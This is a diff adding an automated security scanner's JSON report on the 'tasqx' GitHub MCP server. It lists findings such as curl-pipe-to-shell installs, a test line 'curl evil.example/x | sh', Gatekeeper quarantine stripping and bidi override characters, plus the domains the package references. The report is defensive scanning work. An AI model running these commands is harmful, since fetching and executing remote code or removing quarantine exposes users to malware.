@@ -1,0 +1,166 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "dimitritholen/tasqx",
+    "version": "006482571218b1af0b89fbff42076083f1ec7c6b",
+    "download": "https://codeload.github.com/dimitritholen/tasqx/tar.gz/006482571218b1af0b89fbff42076083f1ec7c6b"
+  },
+  "archive_sha256": "1fd82b55e0422367ee56168cade5d410c6083b7e5459085fda5ea410fdf42cc1",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "tasqx-006482571218b1af0b89fbff42076083f1ec7c6b/DESIGN.md",
+      "line": 1721,
+      "evidence": "curl -fsSL … | sh",
+      "file_sha256": "7a4a15d475c6a8e4618c4db42673db3e3174fd42ef21b4cf12508df164b1dbdb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "tasqx-006482571218b1af0b89fbff42076083f1ec7c6b/install.sh",
+      "line": 5,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/dimitritholen/tasqx/main/install.sh",
+      "file_sha256": "5be30b42e0417ad3ffab5aa73aa0d006c29ea7418e48b9995367a6842fba53f2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "tasqx-006482571218b1af0b89fbff42076083f1ec7c6b/crates/tasqx-core/src/embed/golden.json",
+      "line": 55,
+      "evidence": "\\u{202e}",
+      "file_sha256": "ef29359f33724d50a4e58f04328cf82e3047ab76434b637d2f4584eada161106"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "tasqx-006482571218b1af0b89fbff42076083f1ec7c6b/crates/tasqx-core/src/engine/similar/pairs.json",
+      "line": 556,
+      "evidence": "curl | sh",
+      "file_sha256": "66387ec5e63e9f5b32203dfbf953b81b3f958ed7d3b83f6e82c133ec10ecf271"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "tasqx-006482571218b1af0b89fbff42076083f1ec7c6b/crates/tasqx-core/tests/checks.rs",
+      "line": 493,
+      "evidence": "curl evil.example/x | sh",
+      "file_sha256": "1633972d27b70d38801e996829a8af36db4ea26b87bdc06d6d1c19aa54feea6d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "tasqx-006482571218b1af0b89fbff42076083f1ec7c6b/crates/tasqx-cli/src/docs.rs",
+      "line": 3445,
+      "evidence": "curl -fsSL https://…/install.sh | sh",
+      "file_sha256": "0961fb7d1b9739af389fe9fb57dba635225652c9ca7c84dc51b3d686fc6c50db"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "tasqx-006482571218b1af0b89fbff42076083f1ec7c6b/crates/tasqx-cli/docs-fixtures/baseline/docs-stdout.ansi",
+      "line": 449,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/dimitritholen/tasqx/main/install.sh",
+      "file_sha256": "c6e3be202948723e21eddccc3187bf216c555990a640ae770f777c45f5341d09"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "tasqx-006482571218b1af0b89fbff42076083f1ec7c6b/README.md",
+      "line": 58,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/dimitritholen/tasqx/main/install.sh",
+      "file_sha256": "0ac638161f15f4c2d930a0916b6b980fa03a6f740c3b09e6e415f1d4e0ecda6e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "tasqx-006482571218b1af0b89fbff42076083f1ec7c6b/docs/site/install.md",
+      "line": 28,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/dimitritholen/tasqx/main/install.sh",
+      "file_sha256": "e70e6d29d97408c6fb94b615c56e7723832de062d6f5f3955553baced989681a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "tasqx-006482571218b1af0b89fbff42076083f1ec7c6b/docs/wiki/Getting-Started.md",
+      "line": 29,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/dimitritholen/tasqx/main/install.sh",
+      "file_sha256": "f4cb1b4d2ff3f72945fbaf99152ee486427a13d5b1ba0783cf25ab02cb4866ff"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "tasqx-006482571218b1af0b89fbff42076083f1ec7c6b/docs/maintainers/desktop-release.md",
+      "line": 58,
+      "evidence": "xattr -dr com.apple.quarantine",
+      "file_sha256": "dd26daa4d69922e567ec5137f4044cf351b47abfc397e4107e9e3de2114d4e64"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "tasqx-006482571218b1af0b89fbff42076083f1ec7c6b/scripts/embedding-model.py",
+      "line": 318,
+      "evidence": "\\u{202e}",
+      "file_sha256": "664025ae8bc45510446c334a20d58655d6a5ddaa2715b0e6ac3a3dd672d3a9c4"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "0123456789abcdef0123456789abcdef.eu.r2.cloudflarestorage.com",
+    "10.0.0.1",
+    "127.0.0.1",
+    "127.0.0.1.evil.example",
+    "127.5.6.7",
+    "a.example",
+    "api.github.com",
+    "b.example",
+    "c.example",
+    "c2pa.org",
+    "cdn.example",
+    "claude.ai",
+    "developers.cloudflare.com",
+    "dimitritholen.github.io",
+    "en.wikipedia.org",
+    "eslint.org",
+    "evil.example",
+    "example.com",
+    "example.invalid",
+    "github.com",
+    "google.com",
+    "huggingface.co",
+    "img.shields.io",
+    "localhost.evil.example",
+    "modelcontextprotocol.io",
+    "mutants.rs",
+    "opencollective.com",
+    "raw.githubusercontent.com",
+    "registry.npmjs.org",
+    "schema.tauri.app",
+    "tasqx.local",
+    "tauri.localhost",
+    "tauri.localhost.evil.com",
+    "tidelift.com",
+    "timestamp.digicert.com",
+    "www.apache.org",
+    "www.linkedin.com",
+    "www.rfc-editor.org",
+    "www.w3.org",
+    "x.example",
+    "x.y"
+  ],
+  "install_script": false,
+  "score": "high"
+}
